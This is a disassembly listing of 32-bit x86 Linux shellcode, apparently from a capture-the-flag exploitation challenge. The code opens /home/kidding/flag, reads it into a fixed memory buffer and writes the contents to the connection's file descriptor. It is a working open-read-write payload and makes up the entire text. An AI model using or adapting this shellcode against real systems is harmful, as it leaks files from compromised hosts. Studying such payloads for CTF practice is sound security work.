0:  b8 05 00 00 00          mov    eax,0x5
5:  68 61 67 00 00          push   0x6761
a:  68 67 2f 66 6c          push   0x6c662f67
f:  68 64 64 69 6e          push   0x6e696464
14: 68 65 2f 6b 69          push   0x696b2f65
19: 68 2f 68 6f 6d          push   0x6d6f682f
1e: 89 e3                   mov    ebx,esp
20: b9 00 00 00 00          mov    ecx,0x0
25: ba 00 04 00 00          mov    edx,0x400
2a: cd 80                   int    0x80            ; open file /home/kidding/flag
2c: 89 c3                   mov    ebx,eax
2e: b8 03 00 00 00          mov    eax,0x3
33: b9 00 a0 0e 08          mov    ecx,0x80ea000
38: ba 40 00 00 00          mov    edx,0x40
3d: cd 80                   int    0x80            ; read into 0x80ea000 on bss
3f: 31 db                   xor    ebx,ebx
41: b8 04 00 00 00          mov    eax,0x4
46: b9 00 a0 0e 08          mov    ecx,0x80ea000
4b: ba 40 00 00 00          mov    edx,0x40
50: cd 80                   int    0x80            ; write to socket fd